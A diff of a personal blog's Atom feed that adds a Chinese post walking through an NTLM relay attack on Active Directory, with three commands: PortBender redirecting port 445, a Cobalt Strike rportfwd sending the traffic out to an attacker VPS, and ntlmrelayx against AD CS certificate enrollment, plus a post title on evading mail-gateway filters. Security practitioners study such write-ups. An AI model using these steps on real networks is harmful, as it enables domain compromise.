@@ -1,13 +1,13 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
-  <title>My Blog</title>
+  <title>季伯常  Blog</title>
   
   
-  <link href="https://895515845.github.io/atom.xml" rel="self"/>
+  <link href="https://www.jibochang.link/atom.xml" rel="self"/>
   
-  <link href="https://895515845.github.io/"/>
-  <updated>2023-07-11T14:00:32.872Z</updated>
-  <id>https://895515845.github.io/</id>
+  <link href="https://www.jibochang.link/"/>
+  <updated>2023-11-26T15:38:20.238Z</updated>
+  <id>https://www.jibochang.link/</id>
   
   <author>
     <name>John Doe</name>
@@ -17,9 +17,33 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>实战relay打法</title>
+    <link href="https://www.jibochang.link/2023/11/26/%E5%AE%9E%E6%88%98%E6%89%93ntlmrelay/"/>
+    <id>https://www.jibochang.link/2023/11/26/%E5%AE%9E%E6%88%98%E6%89%93ntlmrelay/</id>
+    <published>2023-11-26T15:35:05.000Z</published>
+    <updated>2023-11-26T15:38:20.238Z</updated>
+    
+    <content type="html"><![CDATA[<p>网上关于relay的文章很多，但都是基于内网靶场的，并没有基于实战的环境进行讲解，在此特地复现实战环境进行配置relay所需要的设置</p><p>域控：10.10.10.1</p><p>辅域：10.10.10.2</p><p>被控机：10.10.10.10</p><p>VPS：1.1.1.1</p><h3 id="上传驱动文件"><a href="#上传驱动文件" class="headerlink" title="上传驱动文件"></a>上传驱动文件</h3><p>可以使用PortBender、DivertTCPconn进行转发，本次使用的是PortBender，需要先上传驱动文件</p><p><img src="/2023/11/26/%E5%AE%9E%E6%88%98%E6%89%93ntlmrelay/image-20231126232254156.png" alt="image-20231126232254156"></p><p>根据实战环境上传对应版本驱动</p><h3 id="端口重定向"><a href="#端口重定向" class="headerlink" title="端口重定向"></a>端口重定向</h3><p>之后通过cs设置端口转发，将10.10.10.10的445转发到8445端口，需要注意的是PortBender 执行需要管理权限，且需在 WinDivert64.sys 同一目录下执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PortBender redirect 445 8445</span><br></pre></td></tr></table></figure><p><img src="/2023/11/26/%E5%AE%9E%E6%88%98%E6%89%93ntlmrelay/image-20231126232336670.png" alt="image-20231126232336670"></p><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p>再通过cs的rportfwd将10.10.10.10的8445转发到cs的445上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rportfwd 8445 1.1.1.1 445</span><br></pre></td></tr></table></figure><p><img src="/2023/11/26/%E5%AE%9E%E6%88%98%E6%89%93ntlmrelay/image-20231126232639020.png" alt="image-20231126232639020"></p><h3 id="设置监听"><a href="#设置监听" class="headerlink" title="设置监听"></a>设置监听</h3><p>上面设置了之后会将10.10.10.10的流量转发到1.1.1.1上，因为实战中vps是访问不到内网的，所以需要在VPS中也配置一个proxychains</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 ntlmrelayx.py -t http://10.10.10.1/certsrv/certfnsh.asp -smb2support --adcs --template domaincontroller</span><br></pre></td></tr></table></figure><p><img src="/2023/11/26/%E5%AE%9E%E6%88%98%E6%89%93ntlmrelay/image-20231126232825126.png" alt="image-20231126232825126"></p><h3 id="强制认证"><a href="#强制认证" class="headerlink" title="强制认证"></a>强制认证</h3><p>最后再通过本地打强制认证</p><p><img src="/2023/11/26/%E5%AE%9E%E6%88%98%E6%89%93ntlmrelay/image-20231126232926147.png" alt="image-20231126232926147"></p><p>打了之后在cs可以看到有流量过来</p><p><img src="/2023/11/26/%E5%AE%9E%E6%88%98%E6%89%93ntlmrelay/image-20231126232943632.png" alt="image-20231126232943632"></p><p>再去看vps上已经成功relay</p><p><img src="/2023/11/26/%E5%AE%9E%E6%88%98%E6%89%93ntlmrelay/image-20231126233050537.png" alt="image-20231126233050537"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;网上关于relay的文章很多，但都是基于内网靶场的，并没有基于实战的环境进行讲解，在此特地复现实战环境进行配置relay所需要的设置&lt;/p&gt;
+&lt;p&gt;域控：10.10.10.1&lt;/p&gt;
+&lt;p&gt;辅域：10.10.10.2&lt;/p&gt;
+&lt;p&gt;被控机：10.10.10.10&lt;/p&gt;
+&lt;</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
     <title>绕过邮件网关关键字拦截</title>
-    <link href="https://895515845.github.io/2023/07/11/%E7%BB%95%E8%BF%87%E9%82%AE%E7%AE%B1%E7%BD%91%E5%85%B3%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4/"/>
-    <id>https://895515845.github.io/2023/07/11/%E7%BB%95%E8%BF%87%E9%82%AE%E7%AE%B1%E7%BD%91%E5%85%B3%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4/</id>
+    <link href="https://www.jibochang.link/2023/07/11/%E7%BB%95%E8%BF%87%E9%82%AE%E7%AE%B1%E7%BD%91%E5%85%B3%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4/"/>
+    <id>https://www.jibochang.link/2023/07/11/%E7%BB%95%E8%BF%87%E9%82%AE%E7%AE%B1%E7%BD%91%E5%85%B3%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4/</id>
     <published>2023-07-11T13:10:05.000Z</published>
     <updated>2023-07-11T14:00:32.872Z</updated>
     
